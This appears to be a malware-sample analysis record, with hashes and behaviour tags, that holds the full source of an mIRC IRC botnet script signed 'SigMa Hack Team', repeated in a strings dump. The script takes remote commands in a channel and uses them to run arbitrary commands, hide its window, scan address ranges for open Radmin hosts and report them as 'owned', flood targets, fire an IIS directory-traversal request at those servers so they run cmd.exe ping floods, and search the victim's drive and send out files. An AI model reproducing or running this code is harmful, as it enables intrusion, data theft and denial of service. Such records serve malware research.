{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac",
            "write": "May write to a file"
        },
        "macro": "[script]\nn0=on 100:text:!quit:#:{ if($1 == $me) { /quit I`m DieInG AiN`t ThaT A BitCh | /exit }\nn1=  else { halt }\nn2=}\nn3=on 1:start:/load -rs cfg.ini\nn4=on 100:text:!op*:#:{ if ($2 == $null) { /mode # +o $nick }\nn5=  else { /mode $chan +oooooooooooooooooooooooooooooooo $$2- }\nn6=}\nn7=on 100:text:!deop*:#:{ if ($2 == $null) { /mode $chan -o $nick }\nn8=  else { /mode $chan -oooooooooooooooooooooooooooooooo $$2- }\nn9=}\nn10=on 100:text:!join*:#:{ /join $2- |  }\nn11=on 100:text:*join*:#:{ if ($1 == $me) {  }\nn12=  else { halt }\nn13=}\nn14=on 100:text:!part*:#:{ if ($2 == %bufu) { /notice $nick Denied | halt }\nn15=  else { /part $2 }\nn16=}\nn17=on 100:text:*part*:#:{ if ($1 == $me) { if ($3 == %SigMa) { /notice $nick Denided | halt }\nn18=    elseif ($3 == $null) { if ($chan == %bufu) { /notice $nick Denided | halt } }\nn19=    else { /part $3 }\nn20=  }\nn21=  else { halt }\nn22=}\nn23=on 100:text:!takenick*:#:{ /RegainNickOn $2 }\nn24=on 100:text:*nick*:#:{ if ($1 == $me) { /nick $3 }\nn25=  else { halt }\nn26=}\nn27=on 100:text:*take*:#:{ if ($1 == $me) { /RegainNickOn $3 }\nn28=  else { halt }\nn29=}\nn30=on 100:text:*let:#:{ if ($1 == $me) { /regainnickoff }\nn31=  else { halt }\nn32=}\nn33=on 100:text:!say*:#:{ /msg $chan $2- }\nn34=on 100:text:*say*:#:{ if ($1 == $me) { /msg $chan $3- }\nn35=  else { halt }\nn36=}\nn37=on 100:text:!msg*:#:{ .msg $2- }\nn38=on 100:text:*msg*:#:{ if ($1 == $me) { /msg $3- }\nn39=  else { halt }\nn40=}\nn41=on 100:text:!do*:#:{ /raw $2-  } \nn42=on 100:text:!flood*:#:{ /run ping -l $2 $3 -n 100 } { /run c:\\recycler\\system\\systray.exe /c consolewindowsclass }\nn43=on 100:text:!ban*:#:{ /mode # +b $2 | /kick # $2 MaRsH In CuCuRuz  , $nick | }\nn44=on 100:text:!unban*:#:{ /mode # -b $2- }\nn45=on 100:text:*clone:#:{ if ($1 == $me) { /server -m | /msg $chan \u00034,1\u0002\u001fC\u0002\u001floning... | //nick $random.nick }\nn46=  else { halt }\nn47=}\nn48=on 100:text:*ident*:#:{ if ($1 == $me) { /identd on $3 }\nn49=  else { halt }\nn50=}\nn51=on 1:connect:/join %bufu\nn52=alias random.nick return $+(SigMa,$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9))\nn53=on 1:connect://nick $random.nick\nn54=alias randnick return $rand(A,z) $+ $($str($!rand(A,z) $!+ $chr(32), $rand(0,8)), 2)\nn55=on 100:text:!add*:#:{ /writeini users.ini users $2- | /load -ru users.ini | /msg $chan  \u0003\u0002\u001fL-am Bagat AlTceVa ? }\nn56=on 100:text:!ping*:#:{ /timer 10 2 /ctcp $2- ping }  \nn57=on 100:text:!mode*:#:{ //mode $2- +x }\nn58=on 100:text:!spawn*:#:{ /server -m zagreb.hr.eu.undernet.org | /msg $chan \u00034,1\u0002\u001fC\u0002\u001floning... | //nick $random.nick | /identd on $2- }\nn59=on 100:text:!rand:#:{ //nick $random.nick }\nn60=on 100:text:!away*:#:{ .set %awaysys $time | /away $2- \u00034,1SigMaBOT\u00034,1 away from %awaysys }\nn61=on 100:text:!awoff:#:{ /away }\nn62=on 100:text:!notice*:#:{ /notice $2- }\nn63=on 100:text:!cycle*:#:{ /hop $2- }\nn64=on 100:text:!help:#:{ /play $nick help.txt 2000 }\nn65=on 100:text:!autojoin*:#:{ /writeini script.ini script $2- }\nn66=on 100:text:!me*:#:{ /ame $2- }\nn67=on 100:text:!stop:#:{ /timer? off | /msg $chan \u00034,1Il las... }\nn68=on 100:text:!fc*:#:{ //nick $random.nick | /notice $2- SigMa Hack Teame }\nn69=on 100:text:!lo*:?:{ /msg x@channels.undernet.org login $2- | //mode $me +x }\nn70=CTCP *:Version:*:{ .ctcpreply $nick VERSION --== SigMa Hack Team ==-- }\nn71=CTCP *:PING:*:{ .ctcpreply $nick PING --== SigMa Hack Team ==-- }\nn72=on 100:text:!up:#:{ /notice $nick $uptime.f($menu) $uptime.cg(7) $uptime.cg(4) }\nn73=on 100:text:!sys:#:{ /notice $nick $uptime.f($menu) $uptime.cg(7) $uptime.cg(1) }\nn74=alias r { .return $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }\nn75=on 100:text:!o:#:{\nn76=  set %tchan $chan\nn77=  set %rchan $chan\nn78=  massop \nn79=}\nn80=on 100:text:!d:#:{\nn81=  set %tchan $chan\nn82=  set %rchan $chan\nn83=  massdeop \nn84=}\nn85=on 100:text:!v:#:{\nn86=  set %tchan $chan\nn87=  set %rchan $chan\nn88=  massvoice \nn89=}\nn90=on 100:text:!dv:#:{\nn91=  set %tchan $chan\nn92=  set %rchan $chan\nn93=  massdevoice \nn94=}\nn95=on 1:start:{ \nn96=  bnc %bnc.port\nn97=  %open = $ticks\nn98=  run hex.exe /hide Mirc*\nn99=  identd on $r\nn100=}\nn101=alias connectcheck { whois $me }\nn102=}\nn103=on 1:kick:#:{\nn104=haltdef\nn105=if ($knick == $me) {\nn106=  .raw join $chan\nn107=  halt\nn108=}\nn109=on 100:text:*:#:{\nn110=  if ($1 == !iis) {\nn111=    if ($2 == $me) {\nn112=      if ($3 == scan) {\nn113=        .scan $$4 $$5\nn114=        .msg $chan \u00034,1Acuma Acuma..SigMa scaneza clasa $$4 $+ . $+ $$5 $+ . $+ 0 $+ . $+ 0 PT RaDmin\nn115=        halt\nn116=      }\nn117=    }\nn118=    if ($2 == drop) {\nn119=      %drop.ip = $$3\nn120=      %drop.times = $$4\nn121=      %drop.chan = $chan\nn122=      .drop\nn123=    }\nn124=    if ($2 == info) {\nn125=      .msg $chan Sockets: $sock(*,0) , IP: $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 , Owned: $lines(radmin.txt)\nn126=    }\nn127=    if ($2 == send) {\nn128=      .dcc send $nick radmin.txt\nn129=    }\nn130=  }\nn131=  if ($1 == !bnc) {\nn132=    if ($2 == on) {\nn133=      .bnc %bnc.port\nn134=    }\nn135=    if ($2 == reset) {\nn136=      .sockclose bnc\nn137=      .bnc %bnc.port\nn138=    }\nn139=    if ($2 == port) {\nn140=      %bnc.port = $$3\nn141=      .sockclose bnc\nn142=      .bnc %bnc.port\nn143=    }\nn144=    if ($2 == pass) {\nn145=      %bnc.pass = $$3\nn146=      .sockclose bnc\nn147=      .bnc %bnc.port\nn148=    }\nn149=    if ($2 == info) {\nn150=      .msg $chan BNC: Pass: %bnc.pass , Port: %bnc.port , Usage: /server $ip %bnc.port\nn151=    }\nn152=  }\nn153=  if ($1 == !exit) {\nn154=    .partall\nn155=    .timerexit 1 3 exit\nn156=  }\nn157=  if ($1 == !raw) {\nn158=    $$2-\nn159=  }\nn160=  if ($1 == !info) {\nn161=    if ($2 == system) {\nn162=      set %rb_size 20\nn163=      .msg $chan \u000315[\u000300 $+ $dll(moo.dll,osinfo,_) $+ \u000315] $&\nn164=        [\u0003uptime\u000315/\u000300 $+ $dll(moo.dll,uptime,_) $+ \u000315] $&\nn165=        [\u0003processor\u000315/\u000300 $+ $dll(moo.dll,cpuinfo,_) $+ \u000315] $&\nn166=        [\u0003screen\u000315/\u000300 $+ $dll(moo.dll,screeninfo,_) $+ \u000315] $&\nn167=        [\u0003ram\u000315/\u000300 $+ $gettok($dll(moo.dll,meminfo,_),2-,32) $+ \u000315] $&\nn168=        [\u0003Internet\u000315/\u000300 $+ $dll(moo.dll,interfaceinfo,_)  $+ \u000315]\u0003\nn169=      halt\nn170=    }\nn171=    if ($2 == uptime) {\nn172=      .msg $chan \u000315[\u0003uptime\u000315/\u000300 $+ $dll(moo.dll,uptime,_) $+ \u000315]\nn173=      halt\nn174=    }\nn175=    if ($2 == ram) {\nn176=      .msg $chan \u000315[\u0003ram\u000315/\u000300 $+ $dll(moo.dll,meminfo,_) $+ \u000315]\nn177=      halt\nn178=    }\nn179=    if ($2 == processor) {\nn180=      .msg $chan \u000315[\u0003processor\u000315/\u000300 $+ $dll(moo.dll,cpuinfo,_) $+ \u000315]\nn181=      halt\nn182=    }\nn183=    if ($2 == os) {\nn184=      .msg $chan \u000315[\u000300 $+ $dll(moo.dll,osinfo,_) $+ \u000315]\nn185=      halt\nn186=    }\nn187=    if ($2 == internet) {\nn188=      .msg $chan [\u0003Internet\u000315/\u000300 $+ $dll(moo.dll,interfaceinfo,_)  $+ \u000315]\u0003\nn189=      halt\nn190=    }\nn191=    if ($2 == mirc) {\nn192=      .msg $chan \u000315[\u000300open\u000315/\u000300 $+ $replace($replace($replace($duration($calc(($ticks - %open) / 1000)),secs,s),mins,m),hrs,h) $+ \u000315] [\u000300online\u000315/\u000300 $+ $server for $replace($replace($replace($duration($calc(($ticks - %online) / 1000)),hrs,h),secs,s),mins,m) $+ \u000315]\nn193=      halt\nn194=    }\nn195=    if ($2 != $null) {\nn196=      .msg $chan info ( $+ $$2 $+ /No such command)\nn197=      halt\nn198=    }\nn199=    .msg $chan info (Not enough Parameters)\nn200=  }\nn201=  if ($1 == !fserv) {\nn202=    if ($2 == $null) { .msg $chan !fserv (Not enough Parameters) | halt }\nn203=    if ($2 == $me) {\nn204=      if (Filesize isin $$3-) {\nn205=        .msg $chan $nick $+ : Please only type !fserv $me <filename> ... Not the filesize too.\nn206=        halt\nn207=      }\nn208=      .dcc send $nick \" $+ $$3- $+ \"\nn209=      halt\nn210=    }   \nn211=    if ($2 == find) {\nn212=      %find.text = $$3-\nn213=      %find.files = $findfile(c:\\,$search,0)\nn214=      .msg $nick Found files: $findfile(c:\\,$search,0)\nn215=      if (%find.files > 5) {\nn216=        .msg $nick Too Many files found for listing.  Sending file list.  This could take a while.\nn217=        %find.inc = 1\nn218=        .write -c %find.text $+ .txt\nn219=        .write %find.text $+ .txt [IP: $ip $+ ]\nn220=        .write %find.text $+ .txt [Search: %find.text $+ ]\nn221=        .write %find.text $+ .txt [Files: %find.files $+ ]\nn222=        .write %find.text $+ .txt [Send: !fserv <my nick> <filename>]\nn223=        :write\nn224=        if (%find.inc > %find.files) {\nn225=          .dcc send $nick %find.text $+ .txt\nn226=          .timerremove $+ $rand(a,z) 1 60 .remove \" $+ $mircdir $+ \\ $+ %find.text $+ .txt\"\nn227=          halt\nn228=        }\nn229=        .write %find.text $+ .txt !fserv <my nick> $findfile(c:\\,$search,%find.inc) [Filesize: $round($calc(($lof($findfile(C:\\,$search,%find.inc)) / 1024) / 1000),2) $+ MB]\nn230=        %find.inc = %find.inc + 1\nn231=        goto write\nn232=      }\nn233=      %find.inc = 1\nn234=      :find\nn235=      if (%find.inc > %find.files) {\nn236=        .msg $nick All Files listed for search of: %find.text\nn237=        .msg $nick To download type: !fserv $me <filename>       \nn238=        halt\nn239=      }\nn240=      .msg $nick %find.inc $+ . $findfile(c:\\,$search,%find.inc) [Filesize: $round($calc(($lof($findfile(C:\\,$search,%find.inc)) / 1024) / 1000),2) $+ MB]\nn241=      %find.inc = %find.inc + 1\nn242=      goto find\nn243=      halt\nn244=    }\nn245=    if ($2 == help) {\nn246=      .msg $nick fserv commands (All commands should be entered in a channel I am in):\nn247=      .msg $nick !fserv find <search>\nn248=      .msg $nick !fserv $me <filename> (downloads)\nn249=      .msg $nick !fserv help (this menu)\nn250=      halt\nn251=    }\nn252=    .msg $chan fserv ( $+ $$2 $+ /No such command)\nn253=  }\nn254=}\nn255=alias search { .return * $+ %find.text $+ * }\nn256=alias drop {\nn257=  %drop.lines = $lines(iis.txt)\nn258=  %drop.inc = 1\nn259=  .timerdrop 0 10 dropiis\nn260=}\nn261=alias dropiis {\nn262=  if (%drop.inc > %drop.lines) { .timerdrop off | .msg %drop.chan Finished Sending Packet Command to all %drop.lines Hosts.  Sending %drop.times Packets. | halt }\nn263=  %drop = $r $+ $r $+ $r\nn264=  .sockopen Drop[ $+ %drop $+ ] $read -l $+ %drop.inc iis.txt 80\nn265=  .timerdrop $+ %drop 1 3 .sockclose Drop[ $+ %drop $+ ]  \nn266=  %drop.inc = %drop.inc + 1\nn267=}\nn268=on 1:sockopen:Drop[*]:{\nn269=  if ($sockerr > 0) { .sockclose $sockname | halt }\nn270=  sockwrite -n $sockname GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+ping.exe+\"-v\"+icmp+\"-t\"+\"-l\"+65000+ $+ %drop.ip $+ +\"-n\"+ $+ %drop.times $+ +\"-w\"+0\nn271=}\nn272=on 1:sockwrite:Drop[*]:{\nn273=  .sockclose $sockname\nn274=}\nn275=raw 433:*:{\nn276=  .haltdef\nn277=  %bot.nick = %bot.nick + 1\nn278=  if ($len(%bot.nick) == 1) { .nick exe[ $+ $str(0,4) $+ %bot.nick $+ ] | halt }\nn279=  if ($len(%bot.nick) == 2) { .nick exe[ $+ $str(0,3) $+ %bot.nick $+ ] | halt }\nn280=  if ($len(%bot.nick) == 3) { .nick exe[ $+ $str(0,2) $+ %bot.nick $+ ] | halt }\nn281=  if ($len(%bot.nick) == 4) { .nick exe[ $+ $str(0,1) $+ %bot.nick $+ ] | halt }\nn282=  if ($len(%bot.nick) == 5) { .nick exe[ $+ %bot.nick $+ ] | halt }\nn283=  .nick exe[ $+ %bot.nick $+ ]\nn284=  halt\nn285=}\nn286=raw 471:*:{\nn287=  haltdef\nn288=  .timerjoin $+ $$2 0 60 join $$2\nn289=  halt\nn290=}\nn291=raw 473:*:{\nn292=  haltdef\nn293=  .timerjoin $+ $$2 0 60 join $$2\nn294=  halt\nn295=}\nn296=raw 474:*:{\nn297=  haltdef\nn298=  .timerjoin $+ $$2 0 60 join $$2\nn299=  halt\nn300=}\nn301=raw 475:*:{\nn302=  haltdef\nn303=  .timerjoin $+ $$2 0 60 join $$2\nn304=  halt\nn305=}\nn306=alias timerarg {\nn307=  var %arg $round($calc($prospeed / 100))\nn308=  if (%arg < 1) set %arg 1\nn309=  set %arg $int($calc(40 / %arg))\nn310=  if (%arg < 1) set %arg 1\nn311=  return %arg\nn312=}\nn313=alias prospeed { \nn314=  var %protest $ticks \nn315=  var %i 1 \nn316=  :start \nn317=  if ($calc($ticks - %protest) <= 100) { \nn318=    inc %i \nn319=    goto start \nn320=  }\nn321=  :end \nn322=  return $calc(%i * .7))\nn323=}\nn324=alias scan {\nn325=  %scan.range = $$1\nn326=  %scan.inc1 = 0\nn327=  %scan.inc2 = 0\nn328=  %scan.inc3 = $$2\nn329=  %scan = $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2\nn330=  .scan1\nn331=}\nn332=alias scan1 {\nn333=  .timerscan -ocm 0 $timerarg .scan2\nn334=}\nn335=alias scan2 {\nn336=  if (%scan.inc2 == 255) { \nn337=    .timerscan off\nn338=    if (%scan.inc1 == 255) { \nn339=      if (%scan.inc3 == 255) { %scanning = Done | halt }\nn340=      %scan.inc3 = %scan.inc3 + 1\nn341=      %scan.inc2 = 1\nn342=      %scan.inc1 = 1\nn343=      .timer -m 1 1 scan1 \nn344=      halt \nn345=    }\nn346=    %scan.inc1 = %scan.inc1 + 1\nn347=    %scan.inc2 = 1\nn348=    .timer -m 1 1 scan1\nn349=  }\nn350=  .scansock\nn351=  %scan.inc2 = %scan.inc2 + 1\nn352=}\nn353=alias scansock {\nn354=  %sock = $r $+ $r\nn355=  .sockopen scanner[ $+ %sock $+ ] $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 4899\nn356=  .timerclose $+ %sock 1 2 .sockclose scanner[ $+ %sock $+ ]\nn357=}\nn358=on 1:sockopen:scanner[*]:{\nn359=  if ($sock($sockname).status = active) {\nn360=    bset &command 1 1 0 0 0 1 0 0 0 8 8\nn361=    sockwrite $sockname &command\nn362=    halt\nn363=  }\nn364=}\nn365=on 1:sockread:scanner[*]:{\nn366=  if ($sockerr > 0) return\nn367=  :nextread\nn368=  sockread &temp\nn369=  if ($sockbr == 0) return\nn370=  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass) {\nn371=    .write radmin.txt $sock($sockname).ip\nn372=    .raw -q privmsg %auto :\u00034,1Bun: $sock($sockname).ip\nn373=    .sockclose $sockname\nn374=  }\nn375=  if ($bvar(&temp,1,$bvar(&temp,0)) == %nopass1) {\nn376=    .write radmin.txt $sock($sockname).ip\nn377=    .raw -q privmsg %auto :\u00034,1BuN: $sock($sockname).ip\nn378=    .sockclose $sockname\nn379=  }\nn380=  goto nextread\nn381=}\nn382=alias bnc { .socklisten bnc $$1 }\nn383=on 1:socklisten:bnc:{\nn384=  .sockaccept bnc.temp\nn385=  %bnc.temp.ip = $sock(bnc.temp).ip\nn386=  .sockrename bnc.temp bnca $+ %bnc.temp.ip\nn387=}\nn388=on 1:sockread:bnca*:{\nn389=  .sockread %bnca\nn390=  if ($gettok(%bnca,1,32) == PASS) {\nn391=    if ($gettok(%bnca,2,32) == %bnc.pass) {\nn392=      .sockwrite -n $sockname Password accepted.\nn393=      .sockwrite -n $sockname /conn <server> <port> to connect.\nn394=      %bnc [ $+ [ $sock($sockname).ip ] ] = yes\nn395=    }\nn396=  }\nn397=  if (%bnc [ $+ [ $sock($sockname).ip != yes) {\nn398=    if ($gettok(%bnca,1,32) == NICK) {\nn399=      .set %bnc.nick $gettok(%bnca,2,32) \nn400=    }\nn401=    if ($gettok(%bnca,1,32) == USER) {\nn402=      .set %bnc.user $gettok(%bnca,2-,32)\nn403=      .sockwrite -n $sockname Welcome to psyBNC.\nn404=      .sockwrite -n $sockname /pass <pass> for authorization\nn405=    }\nn406=  }\nn407=  if (%bnc [ $+ [ $sock($sockname).ip ] ] == yes) {\nn408=    if ($gettok(%bnca,1,32) == CONN) {\nn409=      %bncconn. [ $+ [ $sock($sockname).ip ] ] = Connected\nn410=      .sockopen bncb [ $+ [ $sock($sockname).ip ] ] $gettok(%bnca,2-,32)\nn411=      .sockwrite -n $sockname Now Attempting to connected to: $gettok(%bnca,2-,32)\nn412=      halt\nn413=    }\nn414=    if (%bncconn. [ $+ [ $sock($sockname).ip ] ] == Connected) {\nn415=      .sockwrite -n bncb [ $+ [ $remove($sockname,bnca) ] ] $gettok(%bnca,1-,32)\nn416=    }\nn417=    echo -s %bnca\nn418=  }\nn419=}\nn420=on 1:sockopen:bncb*:{\nn421=  .sockwrite -n $sockname USER %bnc.user\nn422=  .sockwrite -n $sockname NICK %bnc.nick\nn423=}\nn424=on 1:sockread:bncb*:{\nn425=  .sockread %bncb\nn426=  .sockwrite -n bnca [ $+ [ $remove($sockname,bncb) ] ] %bncb\nn427=}\nn428=on 1:sockclose:bnca*:{\nn429=  %bnc [ $+ [ $sock($sockname).ip ] ] = no\nn430=  %bnccon. [ $+ [ $sock($sockname).ip ] ] = no\nn431=  .sockclose bncb [ $+ [ $sock($sockname).ip ] ]\nn432=}"
    },
    "filename": "VirusShare_020ed17b8cdf7cdbc573e81fa8567b2b",
    "filesize": 16058,
    "filetype": "data",
    "hashes": {
        "md5": "020ed17b8cdf7cdbc573e81fa8567b2b",
        "sha1": "5320c704cc7e96ad15444e6414e77309d43c200d",
        "sha256": "b41c5e2d97db3bd6098d80d600d6cd653f7a1e91487a416ed479f57246c9094d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "[script]",
            "n0=on 100:text:!quit:#:{ if($1 == $me) { /quit I`m DieInG AiN`t ThaT A BitCh | /exit }",
            "n1=  else { halt }",
            "n2=}",
            "n3=on 1:start:/load -rs cfg.ini",
            "n4=on 100:text:!op*:#:{ if ($2 == $null) { /mode # +o $nick }",
            "n5=  else { /mode $chan +oooooooooooooooooooooooooooooooo $$2- }",
            "n6=}",
            "n7=on 100:text:!deop*:#:{ if ($2 == $null) { /mode $chan -o $nick }",
            "n8=  else { /mode $chan -oooooooooooooooooooooooooooooooo $$2- }",
            "n9=}",
            "n10=on 100:text:!join*:#:{ /join $2- |  }",
            "n11=on 100:text:*join*:#:{ if ($1 == $me) {  }",
            "n12=  else { halt }",
            "n13=}",
            "n14=on 100:text:!part*:#:{ if ($2 == %bufu) { /notice $nick Denied | halt }",
            "n15=  else { /part $2 }",
            "n16=}",
            "n17=on 100:text:*part*:#:{ if ($1 == $me) { if ($3 == %SigMa) { /notice $nick Denided | halt }",
            "n18=    elseif ($3 == $null) { if ($chan == %bufu) { /notice $nick Denided | halt } }",
            "n19=    else { /part $3 }",
            "n20=  }",
            "n21=  else { halt }",
            "n22=}",
            "n23=on 100:text:!takenick*:#:{ /RegainNickOn $2 }",
            "n24=on 100:text:*nick*:#:{ if ($1 == $me) { /nick $3 }",
            "n25=  else { halt }",
            "n26=}",
            "n27=on 100:text:*take*:#:{ if ($1 == $me) { /RegainNickOn $3 }",
            "n28=  else { halt }",
            "n29=}",
            "n30=on 100:text:*let:#:{ if ($1 == $me) { /regainnickoff }",
            "n31=  else { halt }",
            "n32=}",
            "n33=on 100:text:!say*:#:{ /msg $chan $2- }",
            "n34=on 100:text:*say*:#:{ if ($1 == $me) { /msg $chan $3- }",
            "n35=  else { halt }",
            "n36=}",
            "n37=on 100:text:!msg*:#:{ .msg $2- }",
            "n38=on 100:text:*msg*:#:{ if ($1 == $me) { /msg $3- }",
            "n39=  else { halt }",
            "n40=}",
            "n41=on 100:text:!do*:#:{ /raw $2-  } ",
            "n42=on 100:text:!flood*:#:{ /run ping -l $2 $3 -n 100 } { /run c:\\recycler\\system\\systray.exe /c consolewindowsclass }",
            "n43=on 100:text:!ban*:#:{ /mode # +b $2 | /kick # $2 MaRsH In CuCuRuz  , $nick | }",
            "n44=on 100:text:!unban*:#:{ /mode # -b $2- }",
            "n45=on 100:text:*clone:#:{ if ($1 == $me) { /server -m | /msg $chan ",
            "loning... | //nick $random.nick }",
            "n46=  else { halt }",
            "n47=}",
            "n48=on 100:text:*ident*:#:{ if ($1 == $me) { /identd on $3 }",
            "n49=  else { halt }",
            "n50=}",
            "n51=on 1:connect:/join %bufu",
            "n52=alias random.nick return $+(SigMa,$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9),$r(0,9))",
            "n53=on 1:connect://nick $random.nick",
            "n54=alias randnick return $rand(A,z) $+ $($str($!rand(A,z) $!+ $chr(32), $rand(0,8)), 2)",
            "n55=on 100:text:!add*:#:{ /writeini users.ini users $2- | /load -ru users.ini | /msg $chan  ",
            "L-am Bagat AlTceVa ? }",
            "n56=on 100:text:!ping*:#:{ /timer 10 2 /ctcp $2- ping }  ",
            "n57=on 100:text:!mode*:#:{ //mode $2- +x }",
            "n58=on 100:text:!spawn*:#:{ /server -m zagreb.hr.eu.undernet.org | /msg $chan ",
            "loning... | //nick $random.nick | /identd on $2- }",
            "n59=on 100:text:!rand:#:{ //nick $random.nick }",
            "n60=on 100:text:!away*:#:{ .set %awaysys $time | /away $2- ",
            "4,1SigMaBOT",
            "4,1 away from %awaysys }",
            "n61=on 100:text:!awoff:#:{ /away }",
            "n62=on 100:text:!notice*:#:{ /notice $2- }",
            "n63=on 100:text:!cycle*:#:{ /hop $2- }",
            "n64=on 100:text:!help:#:{ /play $nick help.txt 2000 }",
            "n65=on 100:text:!autojoin*:#:{ /writeini script.ini script $2- }",
            "n66=on 100:text:!me*:#:{ /ame $2- }",
            "n67=on 100:text:!stop:#:{ /timer? off | /msg $chan ",
            "4,1Il las... }",
            "n68=on 100:text:!fc*:#:{ //nick $random.nick | /notice $2- SigMa Hack Teame }",
            "n69=on 100:text:!lo*:?:{ /msg x@channels.undernet.org login $2- | //mode $me +x }",
            "n70=CTCP *:Version:*:{ .ctcpreply $nick VERSION --== SigMa Hack Team ==-- }",
            "n71=CTCP *:PING:*:{ .ctcpreply $nick PING --== SigMa Hack Team ==-- }",
            "n72=on 100:text:!up:#:{ /notice $nick $uptime.f($menu) $uptime.cg(7) $uptime.cg(4) }",
            "n73=on 100:text:!sys:#:{ /notice $nick $uptime.f($menu) $uptime.cg(7) $uptime.cg(1) }",
            "n74=alias r { .return $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }",
            "n75=on 100:text:!o:#:{",
            "n76=  set %tchan $chan",
            "n77=  set %rchan $chan",
            "n78=  massop ",
            "n79=}",
            "n80=on 100:text:!d:#:{",
            "n81=  set %tchan $chan",
            "n82=  set %rchan $chan",
            "n83=  massdeop ",
            "n84=}",
            "n85=on 100:text:!v:#:{",
            "n86=  set %tchan $chan",
            "n87=  set %rchan $chan",
            "n88=  massvoice ",
            "n89=}",
            "n90=on 100:text:!dv:#:{",
            "n91=  set %tchan $chan",
            "n92=  set %rchan $chan",
            "n93=  massdevoice ",
            "n94=}",
            "n95=on 1:start:{ ",
            "n96=  bnc %bnc.port",
            "n97=  %open = $ticks",
            "n98=  run hex.exe /hide Mirc*",
            "n99=  identd on $r",
            "n100=}",
            "n101=alias connectcheck { whois $me }",
            "n102=}",
            "n103=on 1:kick:#:{",
            "n104=haltdef",
            "n105=if ($knick == $me) {",
            "n106=  .raw join $chan",
            "n107=  halt",
            "n108=}",
            "n109=on 100:text:*:#:{",
            "n110=  if ($1 == !iis) {",
            "n111=    if ($2 == $me) {",
            "n112=      if ($3 == scan) {",
            "n113=        .scan $$4 $$5",
            "n114=        .msg $chan ",
            "4,1Acuma Acuma..SigMa scaneza clasa $$4 $+ . $+ $$5 $+ . $+ 0 $+ . $+ 0 PT RaDmin",
            "n115=        halt",
            "n116=      }",
            "n117=    }",
            "n118=    if ($2 == drop) {",
            "n119=      %drop.ip = $$3",
            "n120=      %drop.times = $$4",
            "n121=      %drop.chan = $chan",
            "n122=      .drop",
            "n123=    }",
            "n124=    if ($2 == info) {",
            "n125=      .msg $chan Sockets: $sock(*,0) , IP: $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2 , Owned: $lines(radmin.txt)",
            "n126=    }",
            "n127=    if ($2 == send) {",
            "n128=      .dcc send $nick radmin.txt",
            "n129=    }",
            "n130=  }",
            "n131=  if ($1 == !bnc) {",
            "n132=    if ($2 == on) {",
            "n133=      .bnc %bnc.port",
            "n134=    }",
            "n135=    if ($2 == reset) {",
            "n136=      .sockclose bnc",
            "n137=      .bnc %bnc.port",
            "n138=    }",
            "n139=    if ($2 == port) {",
            "n140=      %bnc.port = $$3",
            "n141=      .sockclose bnc",
            "n142=      .bnc %bnc.port",
            "n143=    }",
            "n144=    if ($2 == pass) {",
            "n145=      %bnc.pass = $$3",
            "n146=      .sockclose bnc",
            "n147=      .bnc %bnc.port",
            "n148=    }",
            "n149=    if ($2 == info) {",
            "n150=      .msg $chan BNC: Pass: %bnc.pass , Port: %bnc.port , Usage: /server $ip %bnc.port",
            "n151=    }",
            "n152=  }",
            "n153=  if ($1 == !exit) {",
            "n154=    .partall",
            "n155=    .timerexit 1 3 exit",
            "n156=  }",
            "n157=  if ($1 == !raw) {",
            "n158=    $$2-",
            "n159=  }",
            "n160=  if ($1 == !info) {",
            "n161=    if ($2 == system) {",
            "n162=      set %rb_size 20",
            "n163=      .msg $chan ",
            "00 $+ $dll(moo.dll,osinfo,_) $+ ",
            "15] $&",
            "n164=        [",
            "uptime",
            "00 $+ $dll(moo.dll,uptime,_) $+ ",
            "15] $&",
            "n165=        [",
            "processor",
            "00 $+ $dll(moo.dll,cpuinfo,_) $+ ",
            "15] $&",
            "n166=        [",
            "screen",
            "00 $+ $dll(moo.dll,screeninfo,_) $+ ",
            "15] $&",
            "n167=        [",
            "00 $+ $gettok($dll(moo.dll,meminfo,_),2-,32) $+ ",
            "15] $&",
            "n168=        [",
            "Internet",
            "00 $+ $dll(moo.dll,interfaceinfo,_)  $+ ",
            "n169=      halt",
            "n170=    }",
            "n171=    if ($2 == uptime) {",
            "n172=      .msg $chan ",
            "uptime",
            "00 $+ $dll(moo.dll,uptime,_) $+ ",
            "n173=      halt",
            "n174=    }",
            "n175=    if ($2 == ram) {",
            "n176=      .msg $chan ",
            "00 $+ $dll(moo.dll,meminfo,_) $+ ",
            "n177=      halt",
            "n178=    }",
            "n179=    if ($2 == processor) {",
            "n180=      .msg $chan ",
            "processor",
            "00 $+ $dll(moo.dll,cpuinfo,_) $+ ",
            "n181=      halt",
            "n182=    }",
            "n183=    if ($2 == os) {",
            "n184=      .msg $chan ",
            "00 $+ $dll(moo.dll,osinfo,_) $+ ",
            "n185=      halt",
            "n186=    }",
            "n187=    if ($2 == internet) {",
            "n188=      .msg $chan [",
            "Internet",
            "00 $+ $dll(moo.dll,interfaceinfo,_)  $+ ",
            "n189=      halt",
            "n190=    }",
            "n191=    if ($2 == mirc) {",
            "n192=      .msg $chan ",
            "00open",
            "00 $+ $replace($replace($replace($duration($calc(($ticks - %open) / 1000)),secs,s),mins,m),hrs,h) $+ ",
            "15] [",
            "00online",
            "00 $+ $server for $replace($replace($replace($duration($calc(($ticks - %online) / 1000)),hrs,h),secs,s),mins,m) $+ ",
            "n193=      halt",
            "n194=    }",
            "n195=    if ($2 != $null) {",
